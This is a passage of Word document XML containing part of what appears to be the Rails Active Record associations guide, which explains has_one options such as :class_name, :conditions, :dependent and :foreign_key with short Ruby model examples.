      <w:tr w:rsidR="002A2B82" w14:paraId="2A5BEDD3" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="44374E4A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18C339E9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Billing", :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :nullify</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14916EFF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23BF928B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association supports these options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07659EA3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60839945" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339BE5E7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECF8FBA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC9D757" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09571FB7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6873BD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D05B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:inverse_of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3240C7E6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A417F8B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:primary_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC6F227" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:readonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1444A959" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29217361" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035424FC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:source_type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1B9BBB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14323A04" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="48"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:validate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E87734" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2231F83C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Setting the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option indicates that this is a polymorphic association. Polymorphic associations were discussed in detail </w:t>
      </w:r>
      <w:hyperlink r:id="rId214" w:anchor="polymorphic-associations" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>earlier in this guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720CD050" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A087F1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autosave</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t>, Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598C248E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70634D1A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the name of the other model cannot be derived from the association name, you can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to supply the model name. For example, if a supplier has an account, but the actual name of the model containing accounts is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Billing</w:t>
      </w:r>
      <w:r>
        <w:t>, you’d set things up this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5664"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="73087438" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C91BF67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E68AE0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Billing"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40EA2E8B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="265F6D80" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F8835E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:conditions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you specify the conditions that the associated object must meet (in the syntax used by an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>WHERE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clause).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6384"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="5C498420" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19D48C03" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A0C00EC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :conditions</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "confirmed = 1"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="098C0932" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B5EABFA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F83BF5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will call the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method on the associated object to delete that object. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:delete</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will delete the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>without</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calling its </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:nullify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then deleting this object will set the foreign key in the association object to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If you set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:restrict</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the deletion of the object is restricted if a dependent associated object exist and a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DeleteRestrictionError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception is raised.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5321114D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default behavior for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dependent =&gt; :restrict</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is to raise a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DeleteRestrictionError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when associated objects exist. Since Rails 4.0 this behavior is being deprecated in favor of adding an error to the base model. To silence the warning in Rails 4.0, you should fix your code to not expect this Exception and add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.active_record.dependent_restrict_raises = false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to your application config.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A19502" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDE45FD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By convention, Rails assumes that the column used to hold the foreign key on the other model is the name of this model with the suffix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> added. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:foreign_key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option lets you set the name of the foreign key directly:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="194CD239" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D2FFA10" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74991B17" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account, :foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "supp_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30B1350C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="33298569" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In any case, Rails will not create foreign key columns for you. You need to explicitly define them as part of your migrations.</w:t>
